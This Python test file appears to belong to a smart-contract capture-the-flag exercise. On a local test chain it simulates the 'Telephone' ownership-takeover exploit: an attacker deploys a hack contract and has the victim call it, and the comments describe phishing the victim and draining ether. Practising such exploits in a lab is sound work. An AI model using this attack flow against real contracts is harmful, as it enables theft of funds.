import os

import pytest

from sc_test_utils import get_web3_instance, load_w3_contract


@pytest.fixture(scope="module")
def setup_module():
    file_name = os.path.basename(__file__)
    print(f": Setting up the module {file_name}")
    current_dir = os.path.dirname(__file__)
    parent_dir = os.path.dirname(current_dir)
    challenge_dir = file_name[5:-3]  # ignore "test_" and ".py"
    challenge_dir = os.path.join(parent_dir, challenge_dir)

    w3 = get_web3_instance()
    vulnerable_contract = load_w3_contract(challenge_dir, file_name='Telephone.sol', version='0.8.0')
    yield w3, vulnerable_contract
    print(f"\nTearing down the module: {file_name}")


def test_exploit(setup_module):
    w3, vulnerable_contract = setup_module
    # Step 0: victim deployed the vulnerable contract
    victim = w3.eth.accounts[0]
    assert vulnerable_contract.functions.owner().call() == victim

    # Step 1: attacker deploys his hack contract
    os.chdir(os.path.dirname(os.getcwd()))
    print(f"current working directory: {os.getcwd()}")
    target_dir = os.path.join(os.getcwd(), "beyond_the_console")
    attacker_account_index = 1
    attacker = w3.eth.accounts[attacker_account_index]

    attacker_contract = load_w3_contract(target_dir, file_name='TelephoneHack.sol',
                                         version='0.8.0', deployer_index=attacker_account_index,
                                         constructor_args=[vulnerable_contract.address])

    # Step 2: Attacker somehow phish (convince) the victim to call the attack function to change ownership
    # This is a simulation of the attack
    attacker_contract.functions.attack(attacker).transact({'from': victim})

    # Step 3: Check if the attacker is now the owner of the vulnerable contract
    assert vulnerable_contract.functions.owner().call() == attacker

    # Step 4: Attacker drains the Telephone contract if it had any ether
    print(f"Attacker successfully changed the owner to {attacker}")
